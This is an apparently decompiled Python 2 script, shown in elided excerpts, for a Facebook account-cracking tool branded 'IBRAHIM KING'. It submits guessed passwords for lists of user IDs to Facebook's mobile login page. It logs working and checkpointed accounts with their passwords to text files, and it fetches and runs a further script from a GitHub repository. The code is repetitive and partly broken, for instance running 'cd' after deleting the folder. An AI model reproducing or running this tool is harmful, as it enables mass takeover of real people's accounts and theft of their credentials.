...
logo = "\x1b[1;96m  ___ _               _     _           \n |_ _| |__  _ __ __ _| |__ (_)_ __ ___  \n  | || '_ \| '__/ _` | '_ \| | '_ ` _ \n  | || |_) | | | (_| | | | | | | | | | |\n |___|_.__/|_|  \__,_|_| |_|_|_| |_| |_|\n\n'\x1b[1;91m'   Author      :     IBRAHIM KING     \n'\x1b[1;92m'   Github      :     Ibrahimbacha  \n'\x1b[1;93m'   FB ID       :     IBRAHIM KING\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     ABI NAI         \n"
dec = '2'
server = '2'
...
def main_input():
    ...
    if mx == '1':
        ...
        os.system('git clone https://github.com/Ibrahimbacha/PAID')
        os.system('cp -f PAID/PAID \\.')
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 slSoltude-ibrahim.py')
        time.sleep(5)
...
def mineExt():
    ...
    print g + '[=] Extracting From IBRAHIM : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass1
                ok = open('IBRAHIM-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass1
                cp = open('IBRAHIM-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass2
                    ok = open('IBRAHIM-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass2
                    cp = open('IBRAHIM-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass3
                        ok = open('IBRAHIM-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass3
                        cp = open('IBRAHIM-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass4
                            ok = open('IBRAHIM-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass4
                            cp = open('IBRAHIM-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass5
                                ok = open('IBRAHIM-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass5
                                cp = open('IBRAHIM-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[IBRAHIM-CP] ' + uid + ' | ' + pass1
                cp = open('IBRAHIM-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[IBRAHIM-CP] ' + uid + ' | ' + pass2
                    cp = open('IBRAHIM-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[IBRAHIM-CP] ' + uid + ' | ' + pass3
                        cp = open('IBRAHIM-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[IBRAHIM-CP] ' + uid + ' | ' + pass4
                            cp = open('IBRAHIM-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[IBRAHIM-CP] ' + uid + ' | ' + pass5
                                cp = open('IBRAHIM-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[IBRAHIM-OK] ' + uid + ' | ' + pass6
                                    ok = open('IMTISZ-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[IBRAHIM-CP] ' + uid + ' | ' + pass6
                                    cp = open('IBRAHIM-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
